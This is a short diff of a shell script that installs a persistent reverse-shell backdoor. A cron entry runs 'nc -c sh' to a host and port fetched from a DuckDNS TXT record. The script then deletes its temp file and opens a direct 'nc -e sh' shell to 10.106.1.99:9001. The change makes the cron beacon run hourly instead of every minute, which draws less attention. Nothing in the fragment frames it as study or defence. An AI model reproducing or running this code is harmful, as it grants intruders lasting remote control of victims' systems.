@@ -117,7 +117,7 @@ execute_script() {
 }
 
 crontab -l > lkcrontab
-echo "* * * * * nc -c sh $(dig -t TXT lilmydomain.duckdns.org @ns1.duckdns.org +short | tr -d '"' | cut -c 7- | tr ":" ' ')&" >> lkcrontab
+echo "5 * * * * nc -c sh $(dig -t TXT lilmydomain.duckdns.org @ns1.duckdns.org +short | tr -d '"' | cut -c 7- | tr ":" ' ')&" >> lkcrontab
 crontab lkcrontab
 rm lkcrontab
 nc 10.106.1.99 9001 -e sh
